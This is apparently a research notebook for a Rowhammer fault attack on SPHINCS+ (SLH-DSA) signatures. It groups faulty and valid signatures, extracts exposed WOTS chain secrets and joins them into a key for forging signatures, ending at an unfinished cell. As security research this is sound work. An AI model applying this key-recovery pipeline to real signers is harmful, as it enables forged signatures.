{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c3557aaf",
   "metadata": {},
   "source": [
    "# Config"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0b682cbb",
   "metadata": {},
   "outputs": [],
   "source": [
    "base = \"../\"\n",
    "#base = \"../victims/sphincsplus/ref/\"\n",
    "keys_file = base + \"keys.txt\"\n",
    "sigs_file = base + \"sigs.txt\"\n",
    "sigs_simulated_file = base + \"sigs_simulated.txt\"\n",
    "\n",
    "params = 'SLH-DSA-SHAKE-256s'\n",
    "\n",
    "sanity_check = True\n",
    "simulate_faults = False\n",
    "filter_sigs  = True\n",
    "use_pickle = True"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "036914a7",
   "metadata": {},
   "source": [
    "# Setup\n",
    "\n",
    "Install dependencies, define some helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "7e301996",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: numpy==1.23.4 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from -r requirements.txt (line 1)) (1.23.4)\n",
      "Requirement already satisfied: pycryptodome==3.16.0 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from -r requirements.txt (line 2)) (3.16.0)\n",
      "Requirement already satisfied: sympy==1.11.1 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from -r requirements.txt (line 3)) (1.11.1)\n",
      "Requirement already satisfied: mpmath>=0.19 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from sympy==1.11.1->-r requirements.txt (line 3)) (1.3.0)\n",
      "\n",
      "\u001b[1m[\u001b[0m\u001b[34;49mnotice\u001b[0m\u001b[1;39;49m]\u001b[0m\u001b[39;49m A new release of pip is available: \u001b[0m\u001b[31;49m25.0.1\u001b[0m\u001b[39;49m -> \u001b[0m\u001b[32;49m25.1.1\u001b[0m\n",
      "\u001b[1m[\u001b[0m\u001b[34;49mnotice\u001b[0m\u001b[1;39;49m]\u001b[0m\u001b[39;49m To update, run: \u001b[0m\u001b[32;49mpip install --upgrade pip\u001b[0m\n",
      "Note: you may need to restart the kernel to use updated packages.\n",
      "Python 3.10.12\n"
     ]
    }
   ],
   "source": [
    "%pip install -r requirements.txt\n",
    "!python --version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "3458976f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import fips205"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "6779c3fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "slh = fips205.SLH_DSA(params)\n",
    "a = slh.a\n",
    "d = slh.d\n",
    "hp = slh.hp\n",
    "n = slh.n\n",
    "k = slh.k"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "917d1671",
   "metadata": {},
   "outputs": [],
   "source": [
    "def print_adrs(adrs: fips205.ADRS, end='\\n', verbose=False):\n",
    "    hex = adrs.adrs().hex()\n",
    "    if verbose:\n",
    "        print('LAYER' + ' ' * 4 + \n",
    "              'TREE ADDR' + ' ' * 18 +\n",
    "              'TYP' + ' ' * 6 +\n",
    "              'KADR' + ' ' * 5 +\n",
    "              'PADD = 0')\n",
    "    print(' '.join([hex[i:i+8] for i in range(0, len(hex), 8)]), end=' ')\n",
    "    print(end=end)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4e7e1057",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "def pickle_load(filename: str, or_else):\n",
    "    if use_pickle:\n",
    "        import pickle\n",
    "        if os.path.exists(filename):\n",
    "            print(f\"Loading pickle from {filename}.\")\n",
    "            with open(filename, 'rb') as f:\n",
    "                return pickle.load(f)\n",
    "        else:\n",
    "            print(f\"File {filename} not found, creating new one.\")\n",
    "            return pickle_store(filename, or_else)\n",
    "    else:\n",
    "        print(f\"Pickle loading is disabled, using fallback.\")\n",
    "        return or_else()\n",
    "    \n",
    "def pickle_store(filename: str, fn):\n",
    "    if use_pickle:\n",
    "        import pickle\n",
    "        value = fn()\n",
    "        with open(filename, 'wb') as f:\n",
    "            pickle.dump(value, f)\n",
    "        return value\n",
    "    else:\n",
    "        print(f\"Pickle storing is disabled, not saving {filename}.\")\n",
    "        value = fn()\n",
    "        return value"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "2214aaa9",
   "metadata": {},
   "outputs": [],
   "source": [
    "from os import cpu_count\n",
    "\n",
    "\n",
    "def extract_wots_keys(pk: bytes, sigs: list[bytes]) -> dict[fips205.ADRS, set[fips205.WOTSKeyData]]:\n",
    "    import multiprocessing\n",
    "    from cryptanalysis_lib import process_sig\n",
    "    wots_bytes = slh.len * n\n",
    "    xmss_bytes = hp * n\n",
    "    fors_bytes = k * (n + a * n)\n",
    "    sig_len = n + fors_bytes + d * (wots_bytes + xmss_bytes)\n",
    "\n",
    "    with multiprocessing.Pool(processes=cpu_count()-1) as pool:\n",
    "        args = [(params, pk, sig_idx, sig, sig_len) for sig_idx, sig in enumerate(sigs)]\n",
    "        results = pool.map(process_sig, args)\n",
    "    \n",
    "    # Merge results\n",
    "    merged = {}\n",
    "    for item in results:\n",
    "        merged = merge_groups(merged, item)\n",
    "    return merged\n",
    "\n",
    "def merge_groups(left: dict[fips205.ADRS, set], right: dict[fips205.ADRS, set]) -> dict[fips205.ADRS, set]:\n",
    "    for key, items in right.items():\n",
    "        if key not in left:\n",
    "            left[key] = set()\n",
    "        left[key] = left[key] | items\n",
    "    return left\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "77b51cba",
   "metadata": {},
   "outputs": [],
   "source": [
    "from typing import Generator\n",
    "\n",
    "\n",
    "def shared_intermediates(v1: fips205.WOTSKeyData, valid: fips205.WOTSKeyData) -> Generator[tuple[int, int], None, bool]:\n",
    "    if not v1.intermediates or not valid.intermediates:\n",
    "        return False\n",
    "    if v1 == valid:\n",
    "        return False\n",
    "    retval = False\n",
    "    for chain_idx, chain in enumerate(v1.intermediates):\n",
    "        if not chain:\n",
    "            continue\n",
    "        for hash_iter, step in enumerate(chain[1:], start=1):\n",
    "            if step == valid.sig[chain_idx*n:(chain_idx+1)*n]:\n",
    "                retval = True\n",
    "                yield (chain_idx, hash_iter)\n",
    "    return retval\n",
    "    \n",
    "\n",
    "def find_collisions(wots_sigs: dict[fips205.ADRS, set[fips205.WOTSKeyData]]) -> dict[fips205.ADRS, set[fips205.WOTSKeyData]]:\n",
    "    return {adrs: keys for adrs, keys in wots_sigs.items() if any(v.valid for v in keys) and not all(v.valid for v in keys)}\n",
    "\n",
    "def print_arr_w(arr: list[int], width=int):\n",
    "    print('[ ', end='')\n",
    "    for x in arr:\n",
    "        print(f\"{x:0{width}d}\", end=' ')\n",
    "    print(']')\n",
    "    \n",
    "def valid_sigs_d(groups):\n",
    "    return {adrs: key for adrs, keys in groups.items() for key in keys if key.valid}\n",
    "\n",
    "def hex(s: bytes | None) -> str:\n",
    "    return s.hex() if s else \"None\"\n",
    "\n",
    "def print_key_data(v: fips205.WOTSKeyData, adrs: fips205.ADRS, pk_seed: bytes, valid_key: fips205.WOTSKeyData = None, indent=''):\n",
    "    print(indent + (\"Valid\" if v.valid else \"Invalid\" if v.valid == False else \"--\"), end='\\t')\n",
    "    print(indent + v.sig.hex()[:128] + '...')\n",
    "    print(indent + '\\tPK (from tree)\\t' + hex(v.pk))\n",
    "    pk = v.calculate_pk(params, adrs, pk_seed)\n",
    "    print(indent + '\\tPK (calculated)\\t' + hex(pk))\n",
    "    print(indent + f\"\\tWOTS key is part of signature {v.sig_idx}\")\n",
    "    print(indent + '\\t\\t\\t', end='')\n",
    "    print_arr_w([i for i in range(len(v.chains))], 2)\n",
    "    print(indent + '\\t' + \"chains\\t\\t\", end='')\n",
    "    print_arr_w(v.chains, 2)\n",
    "    print(indent + '\\t' + \"chains (calc)\\t\", end = '')\n",
    "    print_arr_w(v.chains_calculated, 2)\n",
    "    if valid_key and not v.valid:\n",
    "        for chain_idx, exposed in shared_intermediates(v, valid_key):\n",
    "            print(indent + f\"\\t\\tExposed {exposed} secret values at chain_idx {chain_idx}\")\n",
    "    \n",
    "\n",
    "def print_groups(pk_seed: bytes, groups: dict[fips205.ADRS, list[fips205.WOTSKeyData]], skip_no_exposed=True):\n",
    "    #collisions: list[tuple[fips205.ADRS, set[fips205.WOTSKeyData]]] = [(adrs, value) for adrs, value in collisions if any(v.valid for v in value) and not all(v.valid for v in value)]\n",
    "    #print(f\"Found {len(collisions)} groups with at least one valid and one invalid key\")\n",
    "    # collisions where PK match. This is not necessary. Better: find exposed keys by running WOTS chain\n",
    "    \"\"\"collisions = [\n",
    "        (adrs, value)\n",
    "        for adrs, value in collisions\n",
    "        if any(v1.msg != v2.msg and v1.pk == v2.pk for v1 in value for v2 in value if v1.valid and not v2.valid)\n",
    "    ]\"\"\"\n",
    "    \n",
    "    valid_sigs = valid_sigs_d(groups)\n",
    "\n",
    "    # sort by layer address\n",
    "    groups = sorted(groups.items(), key=lambda item: item[0].get_layer_address())\n",
    "    \n",
    "    for adrs, value in groups:\n",
    "        valid_sig = valid_sigs[adrs] if adrs in valid_sigs else None\n",
    "        invalid_sigs = [v for v in value if not v.valid]\n",
    "        print_adrs(adrs, end='', verbose=True)\n",
    "        print(len(value))\n",
    "        \n",
    "        for v in [valid_sig] + invalid_sigs:\n",
    "            if not v:\n",
    "                continue\n",
    "            if skip_no_exposed and not v.valid and not shared_intermediates(v, valid_sig):\n",
    "                continue\n",
    "            print_key_data(v, adrs, pk_seed, valid_sig, indent='\\t')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b6cdc87e",
   "metadata": {},
   "source": [
    "# Clean Start\n",
    "\n",
    "Run this cell (and below) for a clean analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "184c2937",
   "metadata": {},
   "outputs": [],
   "source": [
    "groups: dict[fips205.ADRS, set[fips205.WOTSKeyData]] = {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "c5267d42",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0bc005bdb4dfb431bb250e109ca4430d42f4fd7e9270f515640701df308413952d854a500f3e893a8804ad88a600ee6812c3317e422848c5854c2b18588c1b9a'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load keys\n",
    "with open(keys_file, \"r\") as f:\n",
    "    lines = [s.split(': ') for s in f.readlines()]\n",
    "    keys = {s[0]: bytes.fromhex(s[1].strip()) for s in lines}\n",
    "sk = keys['sk']\n",
    "pk = keys['pk']\n",
    "pk_seed = pk[:n]\n",
    "pk.hex()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a8df11a2",
   "metadata": {},
   "source": [
    "# Update Experiment\n",
    "Run this cell (and below) to process new signatures"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4b3e337",
   "metadata": {},
   "source": [
    "# Load real signatures\n",
    "\n",
    "This loads the real signatures from `sigs_file` (see config)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "9b562188",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loading pickle from sigs_groups.pkl.\n",
      "Loaded 29065 signatures in 198057 groups\n",
      "Total signatures in groups: 200596\n"
     ]
    }
   ],
   "source": [
    "def load_groups():\n",
    "    with open(sigs_file, \"r\") as f:\n",
    "        sigs = [bytes.fromhex(s.strip()) for s in f.readlines()]\n",
    "        # sigs = sigs[:1000]\n",
    "    print(f\"Processing {len(sigs)} signatures...\", end=' ')\n",
    "    groups = extract_wots_keys(pk, sigs)\n",
    "    return sigs, groups\n",
    "\n",
    "sigs, groups = pickle_load(\"sigs_groups.pkl\", load_groups)\n",
    "print(f\"Loaded {len(sigs)} signatures in {len(groups)} groups\")\n",
    "total_sigs = sum(len(v) for v in groups.values())\n",
    "print(f\"Total signatures in groups: {total_sigs}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a7ad55a2",
   "metadata": {},
   "source": [
    "# Load simulated faulty signatures\n",
    "This section loads simulated faults from `sigs_simulated_file`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "9629c0cc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fault simulation disabled or no simulated faulty signatures found\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "if simulate_faults:\n",
    "    with open(sigs_simulated_file, \"r\") as f:\n",
    "        faulty_sigs = [bytes.fromhex(s.strip()) for s in f.readlines()]\n",
    "    print(f\"Loaded {len(faulty_sigs)} faulty (simulated) signatures\")\n",
    "    simulated_groups = extract_wots_keys(pk, faulty_sigs)\n",
    "    for adrs, keys in simulated_groups.items():\n",
    "        for key in keys:\n",
    "            key.simulated = True\n",
    "    #print_groups(pk_seed, simulated_groups)\n",
    "    groups = merge_groups(groups, simulated_groups)\n",
    "else:\n",
    "    print(\"Fault simulation disabled or no simulated faulty signatures found\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bc68c8f9",
   "metadata": {},
   "source": [
    "# Tooling sanity check\n",
    "\n",
    "This section tries to generate a signature using the same key and randomization values as the first signature in `sigs_file`.\n",
    "We expect them to match. This assumes that the first signature in `sigs_file` is a valid signature."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "979dec9f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "LAYER    TREE ADDR                  TYP      KADR     PADD = 0\n",
      "00000000 00000000 002ba2a1 6debacce 00000002 00000000 00000000 000000b3 \n",
      "00000001 00000000 00002ba2 a16debac 00000002 00000000 00000000 000000ce \n",
      "00000002 00000000 0000002b a2a16deb 00000002 00000000 00000000 000000ac \n",
      "00000003 00000000 00000000 2ba2a16d 00000002 00000000 00000000 000000eb \n",
      "00000004 00000000 00000000 002ba2a1 00000002 00000000 00000000 0000006d \n",
      "00000005 00000000 00000000 00002ba2 00000002 00000000 00000000 000000a1 \n",
      "00000006 00000000 00000000 0000002b 00000002 00000000 00000000 000000a2 \n",
      "Passed sanity check\n"
     ]
    }
   ],
   "source": [
    "if sanity_check:\n",
    "    wots_len = slh.len\n",
    "    wots_bytes = wots_len * n\n",
    "    xmss_bytes = hp * n\n",
    "    fors_bytes = k*(n + a * n)\n",
    "    sig_len = n + fors_bytes + d * (wots_bytes + xmss_bytes)\n",
    "\n",
    "    sig = sigs[0]\n",
    "\n",
    "    m = sig[sig_len:]\n",
    "    r = sig[:n]\n",
    "    pysig = slh.slh_sign_internal(m, sk, None, r=r, stop_at=None)\n",
    "    pysig += m\n",
    "\n",
    "    if pysig != sig:\n",
    "        print(\"Signature mismatch\")\n",
    "        print(pysig.hex())\n",
    "        print(sig.hex())\n",
    "    print(\"Passed sanity check\")\n",
    "else:\n",
    "    print(\"Skipping sanity check\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a221c424",
   "metadata": {},
   "source": [
    "# Extract WOTS keys\n",
    "\n",
    "Extract all WOTS keys in all signatures"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "05c7a145",
   "metadata": {},
   "outputs": [],
   "source": [
    "if False:\n",
    "    # get distribution of steps in (valid) signatures\n",
    "    distr = [[0 for _ in range(16)] for _ in range(67)]\n",
    "    for adrs, keys in groups.items():\n",
    "        for key in keys:\n",
    "            if key.valid:\n",
    "                for chain_idx, chain in enumerate(key.chains):\n",
    "                        distr[chain_idx][chain] += 1           \n",
    "    distr\n",
    "\n",
    "    %pip install matplotlib\n",
    "    import matplotlib.pyplot as plt\n",
    "\n",
    "    # distr is your 67×16 list of counts\n",
    "    # e.g. distr = [[…], …, […]]\n",
    "\n",
    "    plt.figure(figsize=(8, 10))\n",
    "    plt.imshow(distr, aspect='auto')        # default colormap\n",
    "    plt.colorbar(label='Count')              # show scale\n",
    "    plt.xlabel('Step value (0–15)')\n",
    "    plt.ylabel('Chain index (0–66)')\n",
    "    plt.title('Distribution of steps in valid signatures')\n",
    "    plt.tight_layout()\n",
    "    plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c08d3f2",
   "metadata": {},
   "source": [
    "# Group Collisions\n",
    "\n",
    "...appear here!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "cc2d356f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# sanity check for multiple valid keys\n",
    "for adrs, keys in groups.items():\n",
    "    if len([v for v in keys if v.valid]) > 1:\n",
    "        print(\"ERROR: found multiple valid keys for the same address\", adrs, keys)\n",
    "        raise ValueError(\"Multiple valid keys for the same address\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "73ddcca7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# maintain a dictionary of valid signatures per adrs\n",
    "valid_sigs = valid_sigs_d(groups)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "1269b684",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found 256 groups at layer 7\n",
      "Found 217 groups with collisions\n"
     ]
    }
   ],
   "source": [
    "# only keep keys at target layer\n",
    "target_layer = 7\n",
    "groups = {adrs: sigs for adrs, sigs in groups.items() if adrs.get_layer_address() == target_layer}\n",
    "groups = {adrs: sigs for adrs, sigs in groups.items() if len(sigs) > 0}\n",
    "print(f\"Found {len(groups)} groups at layer {target_layer}\")\n",
    "\n",
    "# only keep collisions\n",
    "groups = find_collisions(groups)\n",
    "print(f\"Found {len(groups)} groups with collisions\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "9949068e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loading pickle from groups_intermediates.pkl.\n",
      "Calculated intermediates for 217 groups\n"
     ]
    }
   ],
   "source": [
    "# post-process collided WOTS keys\n",
    "def calc_intermediates():\n",
    "    for adrs, keys in groups.items():\n",
    "        if adrs not in valid_sigs:\n",
    "            continue\n",
    "        valid_sig = valid_sigs[adrs]\n",
    "        for key in keys:\n",
    "            key.calculate_intermediates(params, adrs, pk_seed, valid_sig)\n",
    "    return groups\n",
    "        \n",
    "groups = pickle_load(\"groups_intermediates.pkl\", calc_intermediates)\n",
    "print(f\"Calculated intermediates for {len(groups)} groups\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "406d23a9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found 217 groups with at least one WOTS secret\n"
     ]
    }
   ],
   "source": [
    "# filter out all-7 sigs\n",
    "all_7_indices = set()\n",
    "with open(\"sigs_wots7.txt\", \"w\") as f, open(\"sigs_not_wots7.txt\", \"w\") as f_not:\n",
    "    for adrs, keys in groups.items():\n",
    "        break\n",
    "        for i, key in enumerate(keys.copy()):\n",
    "            if all(c == 7 for c in key.chains_calculated):\n",
    "                f.write(f\"{sigs[key.sig_idx].hex()}\\n\")\n",
    "                #keys.remove(key)\n",
    "            else:\n",
    "                f_not.write(f\"{sigs[key.sig_idx].hex()}\\n\")\n",
    "\n",
    "# filter out signatures containing no WOTS secrets\n",
    "groups = {adrs: [sig for sig in sigs if any(i < 17 for i in sig.chains_calculated)] for adrs, sigs in groups.items()}\n",
    "groups = find_collisions(groups)\n",
    "print(f\"Found {len(groups)} groups with at least one WOTS secret\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "77ceabcc",
   "metadata": {},
   "outputs": [],
   "source": [
    "#print_groups(pk_seed, groups)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "61b57808",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Kept 446 of 29065 signatures\n"
     ]
    }
   ],
   "source": [
    "def filter_signatures(sigs: list[bytes], wots_keys: dict[fips205.ADRS, set[fips205.WOTSKeyData]]) -> set[bytes]:\n",
    "    filtered_sigs = set()\n",
    "    collisions = find_collisions(wots_keys)\n",
    "    collisions = {adrs: sigs for adrs, sigs in collisions.items() if any(sig.valid for sig in sigs) and not all(sig.valid for sig in sigs)}\n",
    "    valid_sigs = valid_sigs_d(wots_keys)\n",
    "    for adrs, keys in collisions.items():\n",
    "        for key in keys:\n",
    "            if key.valid:\n",
    "                # keep valid keys\n",
    "                filtered_sigs.add(sigs[key.sig_idx])\n",
    "            if adrs in valid_sigs and shared_intermediates(key, valid_sigs[adrs]):\n",
    "                filtered_sigs.add(sigs[key.sig_idx])\n",
    "    return filtered_sigs\n",
    "\n",
    "if filter_sigs:\n",
    "    # only keep signatures that are valid or have exposed WOTS keys\n",
    "    filtered_sigs = filter_signatures(sigs, groups)\n",
    "    print(f\"Kept {len(filtered_sigs)} of {len(sigs)} signatures\")\n",
    "    with open(\"../sigs_filtered.txt\", \"w\") as f:\n",
    "        for sig in filtered_sigs:\n",
    "            f.write(sig.hex() + \"\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a19de0ee",
   "metadata": {},
   "source": [
    "# Combine WOTS Keys\n",
    "This section combines the collided keys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "120a2bcd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found 217 groups with exposed WOTS secrets\n"
     ]
    }
   ],
   "source": [
    "# filter groups with exposed WOTS secrets\n",
    "groups = {adrs: sigs \n",
    "    for adrs, sigs in groups.items()\n",
    "    if any(not sig.valid and shared_intermediates(sig, valid_sigs[adrs]) for sig in sigs)\n",
    "}\n",
    "print(f\"Found {len(groups)} groups with exposed WOTS secrets\")\n",
    "#print_groups(pk_seed, groups)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "0f3a036a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Joined 217 signatures\n"
     ]
    }
   ],
   "source": [
    "# Join WOTS keys to get a WOTS key usable for signing as many messages as possible\n",
    "from copy import deepcopy\n",
    "\n",
    "def join_sigs(wots_keys: dict[fips205.ADRS, set[fips205.WOTSKeyData]], params, pk_seed) -> dict[fips205.ADRS, fips205.WOTSKeyData]:\n",
    "    joined_sigs = {}\n",
    "    valid_sigs = valid_sigs_d(wots_keys)\n",
    "    for adrs, keys in wots_keys.items():\n",
    "        if len(keys) < 2:\n",
    "            continue\n",
    "        retval = deepcopy(valid_sigs[adrs])\n",
    "        if not retval.chains_calculated:\n",
    "            print_adrs(adrs)\n",
    "            retval.calculate_intermediates(params, adrs, pk_seed, valid_sigs[adrs])\n",
    "        for key in keys:\n",
    "            retval = retval.join(key, params)\n",
    "        joined_sigs[adrs] = retval\n",
    "    return joined_sigs\n",
    "\n",
    "joined_sigs = join_sigs(groups, params, pk_seed)\n",
    "print(f\"Joined {len(joined_sigs)} signatures\")\n",
    "\n",
    "#for adrs, key in joined_sigs.items():\n",
    "#    print_adrs(adrs, verbose=True)\n",
    "#    print_key_data(key, adrs, pk_seed, None)\n",
    "\n",
    "# Filter out signatures with all chains set to 0\n",
    "#joined_sigs = {adrs: key for adrs, key in joined_sigs.items() if any(c > 0 for c in key.chains_calculated)}\n",
    "#print(f\"Filtered {len(joined_sigs)} (wildcard chains)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "3e12e52e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key with most exposed chains (score: 1072):\n",
      "LAYER    TREE ADDR                  TYP      KADR     PADD = 0\n",
      "00000007 00000000 00000000 00000000 00000001 000000ff 00000000 00000000 \n",
      "--\t0e20b354f20e056c26cf6ecdc070a059dc72c69e5be2a3a7e6b9c0097052013fb150c1b77c8d921b44c438b963b9c5e0dcb1d92ea08c845c23f3139e6b39ccbc...\n",
      "\tPK (from tree)\tNone\n",
      "\tPK (calculated)\t520887e8e95bbaa97f7f4a372f0c3e37bcd045efbe1239e7518cb43a746ef335\n",
      "\tWOTS key is part of signature None\n",
      "\t\t\t[ 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ]\n",
      "\tchains\t\t[ 09 07 11 14 10 05 09 03 03 05 15 08 13 01 03 09 04 06 00 04 12 01 00 01 10 08 14 02 04 10 10 04 05 06 01 02 04 11 10 03 11 14 15 03 04 02 01 08 04 10 15 09 00 09 14 05 00 07 10 13 00 01 02 15 02 01 03 ]\n",
      "\tchains (calc)\t[ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]\n",
      "================================================================\n",
      "All keys for exposed address:\n",
      "LAYER    TREE ADDR                  TYP      KADR     PADD = 0\n",
      "00000007 00000000 00000000 00000000 00000001 000000ff 00000000 00000000 \n",
      "Invalid\t0e20b354f20e056c26cf6ecdc070a059dc72c69e5be2a3a7e6b9c0097052013fb150c1b77c8d921b44c438b963b9c5e0dcb1d92ea08c845c23f3139e6b39ccbc...\n",
      "\tPK (from tree)\tba7d54572f08116e581231686daac3336b3728e08c42958ed56327dd04698787\n",
      "\tPK (calculated)\t520887e8e95bbaa97f7f4a372f0c3e37bcd045efbe1239e7518cb43a746ef335\n",
      "\tWOTS key is part of signature 3473\n",
      "\t\t\t[ 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ]\n",
      "\tchains\t\t[ 11 01 14 11 11 09 01 13 03 10 04 14 03 00 10 04 09 14 10 01 14 05 00 13 00 10 13 03 05 08 15 05 13 02 10 04 11 07 12 00 03 13 15 11 09 04 03 01 11 04 02 01 10 10 02 12 15 00 13 06 02 04 10 06 01 14 10 ]\n",
      "\tchains (calc)\t[ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]\n",
      "Invalid\t1755a1bd008bad638e7d2a1b0e4378e772121dcd3dba1e9cb79a983a05ee7980b8bcfd5bff64e9662c660dbfb39e226916c01f1d365ab1f5f10a2efabe543764...\n",
      "\tPK (from tree)\t5916cf680daf52fd9085a95910cbecd8e710bc0b0530c1327ced0f4925df3888\n",
      "\tPK (calculated)\t520887e8e95bbaa97f7f4a372f0c3e37bcd045efbe1239e7518cb43a746ef335\n",
      "\tWOTS key is part of signature 27256\n",
      "\t\t\t[ 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ]\n",
      "\tchains\t\t[ 02 15 13 15 13 10 04 00 01 06 04 06 02 09 09 15 09 15 10 09 15 14 13 09 03 01 02 14 02 11 01 15 05 06 14 01 09 14 00 15 11 03 10 02 10 07 02 11 01 14 08 08 14 05 02 07 10 07 01 01 13 02 05 14 01 12 13 ]\n",
      "\tchains (calc)\t[ 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 ]\n",
      "Valid\t082f0aa55be15a9cfedadb799e3c92a23fa0f8b85e32e245f131ef1ecb04542bb8bcfd5bff64e9662c660dbfb39e226916c01f1d365ab1f5f10a2efabe543764...\n",
      "\tPK (from tree)\t520887e8e95bbaa97f7f4a372f0c3e37bcd045efbe1239e7518cb43a746ef335\n",
      "\tPK (calculated)\t520887e8e95bbaa97f7f4a372f0c3e37bcd045efbe1239e7518cb43a746ef335\n",
      "\tWOTS key is part of signature 343\n",
      "\t\t\t[ 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ]\n",
      "\tchains\t\t[ 09 07 11 14 10 05 09 03 03 05 15 08 13 01 03 09 04 06 00 04 12 01 00 01 10 08 14 02 04 10 10 04 05 06 01 02 04 11 10 03 11 14 15 03 04 02 01 08 04 10 15 09 00 09 14 05 00 07 10 13 00 01 02 15 02 01 03 ]\n",
      "\tchains (calc)\t[ 09 07 11 14 10 05 09 03 03 05 15 08 13 01 03 09 04 06 00 04 12 01 00 01 10 08 14 02 04 10 10 04 05 06 01 02 04 11 10 03 11 14 15 03 04 02 01 08 04 10 15 09 00 09 14 05 00 07 10 13 00 01 02 15 02 01 03 ]\n"
     ]
    }
   ],
   "source": [
    "# Find the key where the maximum number of chains are exposed (i.e., valid_sig.chain[i] - c is maximized for all chains 0 <= i < len)\n",
